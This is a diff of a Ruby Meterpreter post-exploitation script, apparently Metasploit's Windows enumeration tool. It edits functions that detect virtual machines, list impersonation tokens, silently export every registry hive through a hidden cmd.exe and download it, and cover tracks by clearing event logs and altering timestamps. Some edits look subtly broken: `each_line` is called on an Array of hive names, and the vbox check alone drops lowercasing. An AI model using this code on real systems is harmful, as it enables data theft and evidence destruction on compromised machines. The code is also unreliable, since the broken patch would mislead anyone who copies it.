@@ -154,16 +154,16 @@ def chkvm(session)
 			open_key2 = session.sys.registry.open_key(root_key2,base_key2,KEY_READ)
 			v2 = open_key2.query_value('Identifier')
 
-			if v2.data.downcase.grep("vmware")
+			if v2.data.downcase =~ /vmware/
 				print_status "\tThis is a VMWare virtual Machine"
 				vmout << "This is a VMWare virtual Machine\n\n"
-			elsif v2.data.downcase.grep("vbox")
+			elsif v2.data =~ /vbox/
 				print_status "\tThis is a Sun VirtualBox virtual Machine"
 				vmout << "This is a Sun VirtualBox virtual Machine\n\n"
-			elsif v2.data.downcase.grep("xen")
+			elsif v2.data.downcase =~ /xen/
 				print_status "\tThis is a Xen virtual Machine"
 				vmout << "This is a Xen virtual Machine\n\n"
-			elsif v2.data.downcase.grep("virtual hd")
+			elsif v2.data.downcase =~ /virtual hd/
 				print_status "\tThis is a Hyper-V/Virtual Server virtual Machine"
 				vmout << "This is a Hyper-v/Virtual Server virtual Machine\n\n"
 			end
@@ -296,7 +296,7 @@ def listtokens(session)
 			dt << "#{tType} Delegation Tokens Available \n"
 			dt << "======================================== \n"
 
-			tokens['delegation'].each { |string|
+			tokens['delegation'].each_line{ |string|
 				dt << string + "\n"
 			}
 
@@ -304,7 +304,7 @@ def listtokens(session)
 			dt << "#{tType} Impersonation Tokens Available \n"
 			dt << "======================================== \n"
 
-			tokens['impersonation'].each { |string|
+			tokens['impersonation'].each_line{ |string|
 				dt << string + "\n"
 			}
 	   		i += 1
@@ -372,7 +372,7 @@ def regdump(session,pathoflogs,filename)
 	hives = %w{HKCU HKLM HKCC HKCR HKU}
 	windir = session.fs.file.expand_path("%WinDir%")
 	print_status('Dumping and Downloading the Registry')
-	hives.each do |hive|
+	hives.each_line do |hive|
 		begin
 			print_status("\tExporting #{hive}")
 			r = session.sys.process.execute("cmd.exe /c reg.exe export #{hive} #{windir}\\Temp\\#{hive}#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
@@ -393,7 +393,7 @@ def regdump(session,pathoflogs,filename)
 		end
 	end
 	#Downloading Compresed registry Hives
-	hives.each do |hive|
+	hives.each_line do |hive|
 		begin
 			print_status("\tDownloading #{hive}#{filename}.cab to -> #{pathoflogs}/#{host}-#{hive}#{filename}.cab")
 			session.fs.file.download_file("#{pathoflogs}/#{host}-#{hive}#{filename}.cab", "#{windir}\\Temp\\#{hive}#{filename}.cab")
@@ -428,7 +428,7 @@ end
 def covertracks(session,cmdstomp)
 	clrevtlgs(session)
 	info = session.sys.config.sysinfo
-	trgtos = winver(session)
+	trgtos = info['OS']
 	if trgtos =~ /(Windows 2000)/
 		chmace(session,cmdstomp - nonwin2kcmd)
 	else
@@ -439,7 +439,7 @@ end
 # Function for writing results of other functions to a file
 def filewrt(file2wrt, data2wrt)
 	output = ::File.open(file2wrt, "a")
-	data2wrt.each do |d|
+	data2wrt.each_line do |d|
 		output.puts(d)
 	end
 	output.close
